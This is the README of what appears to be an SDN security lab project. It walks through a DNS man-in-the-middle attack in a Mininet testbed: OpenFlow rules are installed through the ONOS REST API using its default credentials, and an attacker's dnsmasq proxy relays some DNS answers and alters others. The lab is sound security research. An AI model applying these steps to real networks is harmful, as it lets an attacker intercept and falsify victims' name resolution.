# Attack 2 — DNS Man-in-the-Middle via OpenFlow Rule Insertion

## Overview

The attacker inserts itself **on the path** between the victim and the real DNS
server by **installing OpenFlow 1.3 rules on the switch through the ONOS
controller**. The victim's DNS traffic (UDP/53) is steered to the attacker, which
runs a **DNS proxy**: it forwards each query to the genuine resolver, reads the
real reply, and relays it back — so the real server still answers and neither side
knows the attacker is in the middle. For the demo the attacker also **alters one
record in flight**, proving it can both read and modify the traffic.

This is a true man-in-the-middle (not a redirect): the real server stays in the
loop. It exercises the full M1 testbed (Mininet + ONOS + OpenFlow 1.3) and is the
proposal's "OpenFlow rule insertion method + dnsmasq config + metrics".

```
 h1 (victim   10.0.10.11) --\
 h2           10.0.10.12 ----+-- s1 --- r1 --- s3 --- srv (real DNS 10.0.30.10)
 h3 (attacker 10.0.10.13) --/        ONOS controller @ 127.0.0.1:6653

 Normal : h1 -> 10.0.30.10 -> real server answers
 MITM   : ONOS-installed flows on s1 steer h1's UDP/53 to h3 (DNS proxy)
            h3 --forwards--> srv (real) --real answer--> h3 --relays--> h1
            intranet.lab.example -> 10.0.30.90  (RELAYED from the real server)
            www.lab.example      -> 10.6.6.66   (ALTERED by the attacker)
```

Two flows are installed on `s1` at priority 50000 (above ONOS's reactive
forwarding) and marked permanent:

- **Outbound**: `ip_src=h1, udp, ip_dst=10.0.30.10, udp_dst=53` → rewrite dst MAC/IP to h3, output to h3.
- **Return**: `ip_src=h3, udp, ip_dst=h1, udp_src=53` → rewrite src IP back to 10.0.30.10, output to h1.

The victim queries the real resolver address and receives a well-formed reply that
appears to come from it; the attacker sat in the middle of the exchange.

> **Note on the flows.** These are the same two DNS-steering flows regardless of
> what the attacker runs on h3. What makes this a *man-in-the-middle* rather than a
> *redirect* is the attacker's resolver config: a **proxy** that forwards to the
> real server (`dnsmasq-proxy.conf`), not a rogue one that fabricates every answer.

### Two methods

| Method | Script | Notes |
|--------|--------|-------|
| **ONOS REST API** (primary) | `push_dns_hijack.py` / `remove_dns_hijack.py` | The controller installs and *owns* the flows. Use this with ONOS. |
| `ovs-ofctl` direct (fallback) | `dns_hijack.sh` / `dns_restore.sh` | Inserts flows straight onto the switch. **Only works without a controller.** |

> **Important:** when ONOS is running, flows inserted directly with `ovs-ofctl`
> are removed within seconds, because ONOS reconciles the flow table and purges
> any rule it did not install. The `ovs-ofctl` scripts therefore work only in
> standalone mode (no controller). With ONOS, use `push_dns_hijack.py`.

## Files

| File | Purpose |
|------|---------|
| `dns_topo.py` | Mininet topology (OVS kernel datapath, OF1.3). Connects to ONOS, or runs standalone with `DNS_STANDALONE=1`. Writes `/tmp/dns_hijack_env.sh`. |
| `scripts/dnsmasq-legit.conf` | **real** resolver config (host `srv`) — two names: one the attacker tampers, one it must relay |
| `scripts/dnsmasq-proxy.conf` | **attacker** proxy config (host `h3`) — forwards to the real server, alters one record |
| `scripts/push_dns_hijack.py` | installs the DNS-steering flows via the ONOS REST API |
| `scripts/remove_dns_hijack.py` | removes them via the ONOS REST API |
| `scripts/dns_hijack.sh` | fallback: installs the flows with `ovs-ofctl` (standalone only) |
| `scripts/dns_restore.sh` | fallback: removes the `ovs-ofctl` flows |

---

## Requirements

Run on a Linux host with a real kernel — the official Mininet VM, any Ubuntu VM,
or WSL2 (Ubuntu). Do **not** use an unprivileged container / GitHub Codespace:
there the Open vSwitch datapath cannot forward packets and `pingall` drops 100%.

```bash
sudo mn --test pingall --topo single,3        # must print "Results: 0% dropped"

sudo apt-get update
sudo apt-get install -y openvswitch-switch dnsmasq dnsutils tcpdump iperf3 curl
sudo service openvswitch-switch start
sudo service dnsmasq stop 2>/dev/null || true  # free port 53 for per-host dnsmasq

# ONOS runs as a Docker container:
sudo apt-get install -y docker.io
sudo service docker start
sudo docker run --rm hello-world               # "Hello from Docker!" if working
```

---

## Procedure

### Step 1 — Start ONOS

```bash
sudo docker run -d --name onos \
  -p 8181:8181 -p 8101:8101 -p 6653:6653 -p 6640:6640 \
  onosproject/onos:2.7.0
sleep 90     # ONOS takes ~60-90s to boot

curl -u onos:rocks -X POST http://localhost:8181/onos/v1/applications/org.onosproject.openflow/active
curl -u onos:rocks -X POST http://localhost:8181/onos/v1/applications/org.onosproject.fwd/active
```

### Step 2 — Start the testbed

```bash
cd ~/sdn-project/dns-hijacking
sudo python3 dns_topo.py        # banner: "controller: ONOS @ 127.0.0.1:6653"
```
```
mininet> pingall
*** Results: 0% dropped (42/42 received)
```
Confirm ONOS registered the switches:
```bash
curl -u onos:rocks http://localhost:8181/onos/v1/devices | python3 -m json.tool
# s1, s2, s3 with "protocol": "OF_13", "available": true
```

### Step 3 — Start both resolvers

```
mininet> srv dnsmasq --conf-file=$PWD/scripts/dnsmasq-legit.conf
mininet> h3  dnsmasq --conf-file=$PWD/scripts/dnsmasq-proxy.conf
mininet> srv ss -lunp | grep :53
mininet> h3  ss -lunp | grep :53
```
`srv` is the **real** resolver; `h3` is the attacker's **proxy** (forwards to srv).

### Step 4 — Baseline (attack OFF)

```
mininet> h1 dig +short @10.0.30.10 www.lab.example
10.0.30.80
mininet> h1 dig +short @10.0.30.10 intranet.lab.example
10.0.30.90
```
Both honest answers come straight from the real server — the baseline.

### Step 5 — Install the MITM flows (attack ON)

Second terminal (the Mininet CLI stays open):
```bash
cd ~/sdn-project/dns-hijacking/scripts
python3 push_dns_hijack.py --dry-run     # verify host discovery from ONOS
python3 push_dns_hijack.py               # install via the ONOS REST API
```
Both flows should return `HTTP 201`. (Discovery needs `pingall` from Step 2.)

### Step 6 — Confirm the man-in-the-middle

**(a) The attacker relays the real answer** — proof the real server is still in
the loop:
```
mininet> h1 dig +short @10.0.30.10 intranet.lab.example
10.0.30.90
```
Same honest IP as baseline, but it now travelled **victim → h3 → real srv → h3 →
victim**. Confirm the real server was queried **by the attacker**:
```
mininet> srv cat /tmp/srv_dns.log    # query for intranet.lab.example FROM 10.0.10.13 (h3)
mininet> h3  cat /tmp/h3_dns.log     # h3 received it from the victim and forwarded it on
```
The key line in `srv`'s log shows the query source is `10.0.10.13` (the attacker),
**not** `10.0.10.11` — the real server answered the attacker, who relayed it to the
victim. That is the man-in-the-middle.

**(b) The attacker alters a record** — proof it can modify in flight:
```
mininet> h1 dig +short @10.0.30.10 www.lab.example
10.6.6.66
```
`10.0.30.80` → `10.6.6.66`, with no change on the victim. This name was answered
by the attacker locally and **never reached the real server** (it will not appear
in `srv`'s log) — the contrast with (a) is the point.

**(c) Control-plane evidence** — ONOS owns the flows and they are live:
```bash
curl -u onos:rocks "http://localhost:8181/onos/v1/flows/application/org.sdnproject.dnshijack" | python3 -m json.tool
sudo ovs-ofctl -O OpenFlow13 dump-flows s1 | grep -E 'tp_dst=53|tp_src=53'
```

### Step 7 — Teardown

```bash
python3 remove_dns_hijack.py
```
```
mininet> h1 dig +short @10.0.30.10 www.lab.example       # 10.0.30.80 again
mininet> h1 dig +short @10.0.30.10 intranet.lab.example  # 10.0.30.90
mininet> exit
```
```bash
sudo mn -c
sudo docker rm -f onos
```

---

## Evaluation (metrics for the report)

Record each metric attack OFF (baseline) and attack ON.

**How easy to conduct**
- Attacker prerequisites: a host on the LAN + reachability to the controller's REST API.
- Time to compromise: two REST calls (`push_dns_hijack.py`), both sub-second.
- Success rate — 20 queries of the tampered name:
  ```
  mininet> h1 bash -c 'for i in $(seq 20); do dig +short @10.0.30.10 www.lab.example; done'
  ```

**What it targets**
- SDN component abused: the control-plane flow table on `s1`, via ONOS's northbound API.
- Control-plane corruption — the false flows and how long they persist:
  ```bash
  curl -u onos:rocks "http://localhost:8181/onos/v1/flows/application/org.sdnproject.dnshijack" | python3 -m json.tool
  ```

**Consequences**
- MITM proof: `intranet.lab.example` relayed (real server queried **by h3**), `www.lab.example` altered — both from one capture.
- Interception completeness: fraction of the 20 answers that are the attacker's.
- Latency: `mininet> h1 ping -c 20 10.0.30.10`, attack off vs on (a small rise = the detour via h3).
- Throughput: `iperf3` between two hosts, attack off vs on.
- Controller cost: `sudo docker stats onos --no-stream`.

---

## Standalone mode (no ONOS)

If ONOS/Docker is unavailable, run the switches as L2 learning switches and
install the flows directly:

```bash
sudo DNS_STANDALONE=1 python3 dns_topo.py     # no controller
# ... pingall, start BOTH resolvers (legit on srv, proxy on h3), baseline ...

cd scripts
sudo bash dns_hijack.sh         # install flows with ovs-ofctl
# ... confirm relay (intranet=10.0.30.90) + tamper (www=10.6.6.66) ...
sudo bash dns_restore.sh        # remove them
```
Same MITM at the data plane; note it as the fallback controller mode. (The
`ovs-ofctl` scripts read `/tmp/dns_hijack_env.sh`, written by `dns_topo.py`.)

---

## Troubleshooting

- **`pingall` drops 100%** → container/Codespace, not a real kernel. Use a VM or WSL2.
- **`push_dns_hijack.py` says "victim or attacker not found in ONOS hosts"** → run `pingall` first so ONOS learns the hosts.
- **`intranet.lab.example` returns nothing under attack** → the attacker's proxy is not forwarding; check `dnsmasq-proxy.conf` has `server=10.0.30.10` and `srv`'s resolver is running.
- **`dig` still returns `10.0.30.80` after installing with `ovs-ofctl` under ONOS** → ONOS purged the direct flows. Use `push_dns_hijack.py`, or `DNS_STANDALONE=1`.
- **dnsmasq "address already in use"** → a system dnsmasq holds port 53: `sudo service dnsmasq stop`.
- **`/tmp/dns_hijack_env.sh not found`** (standalone) → start `dns_topo.py` first; it writes the file.
```
